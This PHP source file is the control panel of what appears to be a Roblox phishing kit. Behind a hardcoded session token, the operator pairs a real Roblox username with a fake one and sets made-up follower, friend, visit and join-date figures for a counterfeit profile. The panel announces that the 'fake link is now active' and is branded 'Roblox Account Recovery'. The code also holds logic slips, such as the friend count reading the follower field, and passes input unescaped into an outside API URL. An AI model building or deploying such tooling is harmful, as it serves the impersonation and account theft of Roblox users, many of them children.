<?php
session_start();
require('../../../../setup.php');
if($_SESSION['token']=="QUBRWEBIRWBQYEIYOB"){
if($_GET['logout']=='true'){
$_SESSION['token'] = '';
header('location: login');
}
$rusername = htmlspecialchars(file_get_contents('realusername.txt'));
$userid = json_decode(file_get_contents("https://api.newstargeted.com/roblox/users/v2/user.php?username=$rusername"))->userId;
$fakeusername = htmlspecialchars(file_get_contents('fakeusername.txt'));
if($_POST['realusername']){
$new_realusername = $_POST['realusername'];
$ab = file_get_contents("https://api.newstargeted.com/roblox/users/v2/user.php?username=$new_realusername");
if(!empty(json_decode($ab)->name)){
file_put_contents('realusername.txt', json_decode($ab)->name);
echo '<script>alert("The Real Username has been successfully changed!");</script>';
} else {
echo '<script>alert("The Real Username cannot be found on Roblox!");</script>';
}
}
if($_POST['fakeusername']){
file_put_contents('fakeusername.txt', $_POST['fakeusername']);
echo '<script>alert("The Fake Username has been successfully changed!");</script>';
}
if($_POST['aboutme']){
file_put_contents('aboutme.txt', $_POST['aboutme']);
echo '<script>alert("The About Me has been successfully changed!");</script>';
}
if($_POST['aboutme']){
file_put_contents('aboutme.txt', $_POST['aboutme']);
echo '<script>alert("The About Me has been successfully changed!");</script>';
}

if($_POST['followers']){
$value = str_replace('-','',$_POST['followers']);
$value = str_replace(',','',$value);
$value = str_replace('.','',$value);
if(is_numeric($value)){
file_put_contents('followers.txt', $value);
echo '<script>alert("The Follower Count has been successfully changed!");</script>';
} else {
die('<b>Please enter a valid number before submitting.</b>');
}
}

if($_POST['friends']){
$value = str_replace('-','',$_POST['followers']);
$value = str_replace(',','',$value);
$value = str_replace('.','',$value);
if(is_numeric($value)){
if($value < 201){
file_put_contents('friends.txt', $value);
echo '<script>alert("The Friend Count has been successfully changed!");</script>';
} else {
die('<b>The Friend Count must be below 201.</b>');
}
} else {
die('<b>Please enter a valid number before submitting.</b>');
}
}

if($_POST['followings']){
$value = str_replace('-','',$_POST['followings']);
$value = str_replace(',','',$value);
$value = str_replace('.','',$value);
if(is_numeric($value)){
file_put_contents('followers.txt', $value);
echo '<script>alert("The Following Count has been successfully changed!");</script>';
} else {
die('<b>Please enter a valid number before submitting.</b>');
}
}

if($_POST['joindate']){
$joindate = str_replace('-', '/', $_POST['joindate']);
file_put_contents('joindate.txt', $joindate);
echo '<script>alert("The Join Date has been successfully changed!");</script>';
}

if($_POST['placevisits']){
$value = str_replace('-','',$_POST['placevisits']);
$value = str_replace(',','',$value);
$value = str_replace('.','',$value);
if(is_numeric($value)){
file_put_contents('placevisits.txt', $value);
echo '<script>alert("The Place Visit Count has been successfully changed!");</script>';
} else {
die('<b>Please enter a valid number before submitting.</b>');
}
}

if($_POST['activity']){
if($_POST['activity']=='Game'){
file_put_contents('activity.txt', 'game');
echo '<script>alert("The Activity has been successfully changed!");</script>';
}
if($_POST['activity']=='Studio'){
file_put_contents('activity.txt', 'studio');
echo '<script>alert("The Activity has been successfully changed!");</script>';
}
if($_POST['activity']=='Online'){
file_put_contents('activity.txt', 'online');
echo '<script>alert("The Activity has been successfully changed!");</script>';
}
if($_POST['activity']=='Offline'){
file_put_contents('activity.txt', 'offline');
echo '<script>alert("The Activity has been successfully changed!");</script>';
}
}
} else {
header('location: login');
}
?>
<!DOCTYPE html>
<html lang="zxx">
<head>

<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title><?=$name?> - Controller</title>
<link rel="icon" href="<?=$thumbnail?>" type="image/png">
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/css/bootstrap1.min.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/themefy_icon/themify-icons.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/niceselect/css/nice-select.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/owl_carousel/css/owl.carousel.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/gijgo/gijgo.min.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/font_awesome/css/all.min.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/tagsinput/tagsinput.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/datepicker/date-picker.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/scroll/scrollable.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/datatable/css/jquery.dataTables.min.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/datatable/css/responsive.dataTables.min.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/datatable/css/buttons.dataTables.min.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/text_editor/summernote-bs4.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/morris/morris.css">
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/vendors/material_icon/material-icons.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/css/metisMenu.css">
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/css/style1.css" />
<link rel="stylesheet" href="https://demo.dashboardpack.com/sales-html/css/colors/default.css" id="colorSkinCSS">
</head>
<body class="crm_body_bg">


<nav class="sidebar vertical-scroll  ps-container ps-theme-default ps-active-y">
<div class="logo d-flex justify-content-between">
<h1><code><?=$name?></code></h1>
<div class="sidebar_close_icon d-lg-none">
<i class="ti-close"></i>
</div>
</div>
<ul id="sidebar_menu">
<li class="mm-active">
<a class="has-arrow" href="#" aria-expanded="false">
<div class="icon_menu">
<img src="https://demo.dashboardpack.com/sales-html/img/menu-icon/dashboard.svg" alt="">
</div>
<span>Dashboard</span>
</a>
<ul>
<li><a class="active">Controller</a></li>
</ul>
</li>
</ul>
</nav>

<section class="main_content dashboard_part large_header_bg">

<div class="container-fluid g-0">
<div class="row">
<div class="col-lg-12 p-0 ">
<div class="header_iner d-flex justify-content-between align-items-center">
<div class="sidebar_icon d-lg-none">
<i class="ti-menu"></i>
</div>
<div class="serach_field-area d-flex align-items-center">
<div class="search_inner">
<form action="#">
<div class="search_field">
<input type="text" placeholder="Search here...">
</div>
<button type="submit"> <img src="https://demo.dashboardpack.com/sales-html/img/icon/icon_search.svg" alt=""> </button>
</form>
</div>
<span class="f_s_14 f_w_400 ml_25 white_text text_white">Apps</span>
</div>
<div class="header_right d-flex justify-content-between align-items-center">
<div class="header_notification_warp d-flex align-items-center">
<li>
<a class="bell_notification_clicker nav-link-notify"> <img src="https://demo.dashboardpack.com/sales-html/img/icon/bell.svg" alt="">
</a>

<div class="Menu_NOtification_Wrap">
<div class="notification_Header">
<h4>Notifications</h4>
</div>
<div class="Notification_body">

<div class="single_notify d-flex align-items-center">
<div class="notify_thumb">
<a><img src="<?=$thumbnail?>" alt=""></a>
</div>
<div class="notify_content">
<a><h5><?=$name?> Server</h5></a>
<p>Your fake link is now active! Go to <b>Dashboard > Statistics</b> to view your statistics.</p>
</div>
</div>
</div>
<div class="nofity_footer">
</div>
</div>

</li>
</div>
<div class="profile_info">
<img src="<?=$thumbnail?>">
<div class="profile_info_iner">
<div class="profile_author_name">
<p>User</p>
<h5><?=$fakeusername?></h5>
</div>
<div class="profile_info_details">
<a href="?logout=true">Log Out </a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="main_content_iner ">
<div class="container-fluid p-0 sm_padding_15px">
<div class="row justify-content-center">
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Real Username</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=$rusername?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" name="realusername" placeholder="New Real Username">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Fake Username</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=$fakeusername?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" name="fakeusername" placeholder="New Fake Username">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change About Me</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=htmlspecialchars(file_get_contents('aboutme.txt'))?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" name="aboutme" placeholder="New About Me">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Friend Count</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=number_format(htmlspecialchars(file_get_contents('friends.txt')))?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" type="text" name="friends" id="friends" oninput="numerico()" placeholder="New Friend Count">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Follower Count</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=number_format(htmlspecialchars(file_get_contents('followers.txt')))?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" type="text" name="followers" id="followers" oninput="numerico()" placeholder="New Follower Count">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Following Count</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=number_format(htmlspecialchars(file_get_contents('followings.txt')))?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" type="text" name="followings" id="followings" oninput="numerico()" placeholder="New Following Count">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Join Date</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=htmlspecialchars(file_get_contents('joindate.txt'))?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" type="date" name="joindate" placeholder="New Join Date">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Place Visits</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=number_format(htmlspecialchars(file_get_contents('placevisits.txt')))?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<input required class="form-control" type="text" name="placevisits" id="placevisits" oninput="numerico()" placeholder="New Place Visit Count">
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
<div class="col-lg-4">
<form method="POST">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0">Change Activity</h3>
</div>
</div>
</div>
<div class="white_card_body">
<h6 class="card-subtitle mb-2 mb-2"><code>Current:</code></h6>
<div class=" mb-0">
<input required class="form-control" value="<?=htmlspecialchars(file_get_contents('activity.txt'))?>" disabled>
</div><br>
<h6 class="card-subtitle mb-2 mb-2"><code>New:</code></h6>
<div class=" mb-0">
<select class="form-control" name="activity">
<option>Game</option>
<option>Studio</option>
<option>Online</option>
<option>Offline</option>
</select>
</div>
<br>
<button type="submit" class="btn btn-primary">Submit</button>
</div>
</div>
</div>
</form>
</div>
</div>
</div>

<div class="footer_part">
<div class="container-fluid">
<div class="row">
<div class="col-lg-12">
<div class="footer_iner text-center">
<p>Powered by <?=$name?> | Roblox Account Recovery</p>
</div>
</div>
</div>
</div>
</div>
</section>


</div>
</div>
</div>
<div id="back-top" style="display: none;">
<a title="Go to Top" href="#">
<i class="ti-angle-up"></i>
</a>
</div>
<script>
function numerico(){
document.getElementById('friends').value = document.getElementById('friends').value.replace(/\D/g,'');
if(document.getElementById('friends').value > 200){
document.getElementById('friends').value = '200';
}
document.getElementById('followers').value = document.getElementById('followers').value.replace(/\D/g,'');
document.getElementById('followings').value = document.getElementById('followings').value.replace(/\D/g,'');
document.getElementById('placevisits').value = document.getElementById('placevisits').value.replace(/\D/g,'');
}
</script>
<script src="https://demo.dashboardpack.com/sales-html/js/jquery1-3.4.1.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/js/popper1.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/js/bootstrap.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/js/metisMenu.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/count_up/jquery.waypoints.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/chartlist/Chart.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/count_up/jquery.counterup.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/niceselect/js/jquery.nice-select.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/owl_carousel/js/owl.carousel.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/jquery.dataTables.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/dataTables.responsive.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/dataTables.buttons.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/buttons.flash.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/jszip.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/pdfmake.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/vfs_fonts.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/buttons.html5.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/datatable/js/buttons.print.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/js/chart.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/progressbar/jquery.barfiller.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/tagsinput/tagsinput.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/text_editor/summernote-bs4.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/am_chart/amcharts.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/scroll/perfect-scrollbar.min.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/scroll/scrollable-custom.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/chart_am/core.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/chart_am/charts.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/chart_am/animated.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/chart_am/kelly.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/vendors/chart_am/chart-custom.js"></script>
<script src="https://demo.dashboardpack.com/sales-html/js/custom.js"></script>
</body>
</html>